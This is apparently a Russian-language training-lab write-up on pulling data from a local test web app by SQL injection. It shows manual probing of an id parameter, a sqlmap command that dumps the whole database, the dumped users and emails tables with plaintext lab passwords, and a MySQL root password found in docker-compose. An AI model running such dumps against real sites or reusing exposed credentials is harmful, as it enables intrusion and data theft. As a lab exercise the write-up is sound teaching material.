### Получение данных через SQLi:

1. Выполню установку БД с web-страницы согласно заданию
<br/>http://192.168.1.17:8080
2. Начну смотреть данные с web-страницы
<br/>http://192.168.1.17:8080/task/
2.1. Здесь мне предложено ввести в качестве параметра id (видимо пользователя)
<br/>Добавляю параметр (id=1) и вижу результат с логином "admin"
<br/>http://192.168.1.17:8080/task?id=1
<br/>http://192.168.1.17:8080/task?id=2
<br/>...

Были сделаны попытки введения запросов (без результатов):
http://192.168.1.17:8080/task?username=Volk2
http://192.168.1.17:8080/task?id=2&select=username,password
http://192.168.1.17:8080/task?id=2&select=password

#### Последующий анализ буду проводить утилитой [SQLMap](https://github.com/sqlmapproject/sqlmap)
<br/>попробую снять дамп с БД...
<br/>python ./sqlmap.py -u "http://192.168.1.17:8080/task/?id=1" --dump
<br/>Готово

##### Получены файлы:
- users.csv
- emails.csv

##### Посмотрю таблицу users.csv

|id|password|username|
|-|-|-|
|1|kjhsd8@j0dfjk3$%jksli|admin|
|2|nu zayzc, nu pogodi!|Volk|
|3|a ya vse chawe zame4aiu, 4to menya kak budto kto-to podmenil|Matroskin|
|4|Ya tu4ka-tu4ka-tu4ka|Vinni-pukh|
|5|na Lune|Neznaika|
|6|Gav|kotenok|
|7|muwchina v samom rascvete sil|Karlson|
|8|pust vsegda budet Vovka |Kesha|
|9|Wa spoiuuuuu|Volk2|

Получен пароль пользователя Volk2
<br/>User: Volk2
<br/>Password: Wa spoiuuuuu

##### Посмотрю таблицу emails.csv
|id|email_id|
|-|-|
|1|admin@otus-lab.com|
|2|volchara1969@otus-lab.com|
|3|matroskin_is_prostokvashino@otus-lab.com|
|4|honey_lover@otus-lab.com|
|5|ne.znaika@otus-lab.com|
|6|kotenok@otus-lab.com|
|7|karlson@otus-lab.com|
|9|volk@otus-lab.com|

Получен почтовый ящик пользователя с ником Volk2 (соответствие id)
<br/>User: Volk2
<br/>Email: volk@otus-lab.com

### Другой вариант получения всех таблиц и данных (обычный вход в БД MySQL)
(т.к. в docker-compose уже оставлен пароль администратора БД)
server: 192.168.1.17
port: 8989
login: root
password: Vdjo7#l-er

